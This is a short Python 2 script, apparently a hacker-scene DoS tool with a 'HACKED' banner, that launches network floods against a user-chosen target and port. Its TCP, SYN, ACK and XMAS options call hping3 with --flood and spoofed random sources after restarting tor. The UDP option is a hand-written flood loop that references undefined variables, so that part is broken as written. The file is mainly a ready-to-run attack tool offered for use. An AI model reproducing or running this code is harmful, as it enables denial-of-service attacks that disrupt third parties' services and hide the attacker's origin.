#!/usr/local/bin/python
# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to show / edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
"""


 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
 ▒ ▒░▒ ▒▒   ▓▒█ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░   ░  ░   ▒   ░        ░  ░    ░    ░ ░  ░ 
 ░  ░  ░      ░   ░      ░  ░      ░  ░   ░    
                  ░                       ░      


"""
import os
import sys
import random
import socket
import socks
import requests
lred = '\033[91m'
lblue = '\033[94m'
lgreen = '\033[92m'
yellow = '\033[93m'
cyan = '\033[1;36m'
purple = '\033[95m'
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
orange = '\033[33m'

colorlist = [red, blue, green, yellow, lblue, purple, cyan, lred, lgreen, orange]
randomcolor = random.choice(colorlist)
banner3list = [red, blue, green, purple]

def dos():
	print """
{0}tcp: * tcp target port
{1}udp: * udp target port
{2}syn: * syn target port
{3}ack: * ack target port
{4}xmas: * xmas target port
\033[0m
!Press CTRL C to stop attacking!
	""".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
	try:
		command, target, port = raw_input("Method: ").split()
		if command == "tcp":
			os.system("service tor restart")
			os.system("hping3 --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
		if command == "udp":
			try:
				ip = socket.gethostbyname(target)
				port = int(port)
				os.system("service tor restart")
				sent = 0						
				while True:
					print N+"UDP attack sending | {6}{5}\033[0m | {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year,ip,random.choice(colorlist))
					sock.sendto(Gb, (ip,port))
					sock.sendto(bytes, (ip,port))
					sock.sendto(Kb, (ip,port))
					sent = sent + 1
					port = port + 1
					if port == 65534:
						port = 1
			except:
				print "\nUDP flood stopped\n"
				os.system("")
		if command == "syn":
			os.system("service tor restart")
			os.system("hping3 -S --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
		if command == "ack":
			os.system("service tor restart")
			os.system("hping3 -A --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
		if command == "xmas":
			os.system("hping3 -X --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
	except:
		print "\n\033[91mError: Not Enough Arguments\033[0m\n "

dos()
